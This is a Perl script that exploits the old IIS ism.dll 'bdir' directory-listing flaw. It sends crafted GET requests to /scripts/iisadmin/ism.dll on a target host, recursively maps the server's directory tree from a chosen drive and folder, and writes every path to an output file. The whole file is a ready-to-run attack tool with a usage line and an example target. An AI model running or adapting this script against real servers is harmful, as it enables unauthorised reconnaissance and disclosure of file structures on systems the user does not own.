#!/usr/bin/perl -w
#
#
#
#
use LWP::UserAgent;

if ($#ARGV != 3) {
        print "Usage: $0 <target host> <drive> <starting directory> <output file>\n";
	print "<starting directory> much have \\ escaped\n";
	print "EX: $0 192.168.0.1 c: inetpub\\\\wwwroot foo.txt\n";
        exit(1);
}

my $host = $ARGV[0];
my $drive = $ARGV[1];
my $sdir = $ARGV[2];
my $outfile = $ARGV[3];

my @Dirs;

open (OUT, ">$outfile") or die("unable to open $outfile: $!");

print OUT "Starting Directory Traversal...\n\n";
chomp $sdir;
@Dirs = &BuildStruct($sdir);
print OUT "\n\nFinished Directory Traversal\n";

sub BuildStruct() {
	my ($dir) = @_;
	my %DirStruct;
	print OUT "$dir\n";

	@{ $DirStruct{$dir} } = &GetDirs($dir);
	foreach (@{ $DirStruct{$dir} }) { &BuildStruct($_); }
}

sub GetDirs {
	my ($dir) = @_;
	my $target = "http://" . $host . '/scripts/iisadmin/ism.dll?dir/bdir+?' . $drive . "?" . $drive . "\\" . $dir; 
	my $ua = new LWP::UserAgent;
	my $req = new HTTP::Request GET => "$target";
	my $res = $ua->request($req);

	my @content = split /\n/, $res->content;
	my @links;
	foreach (@content) { if (/a href/i) { push @links, $_; } }
	foreach (@links) { /a href=".*?">(.*)<\/a>/i; $_ = $1; } 

	# remove drive and path listing 
	my $i=0;
	my @folders = split /\\/, $dir;
	foreach (@links) { $i++; last if /$folders[$#folders]/; }
	splice @links, 0, $i;

	foreach (@links) { $_ = $dir . "\\" . $_; }
	return(@links);
}
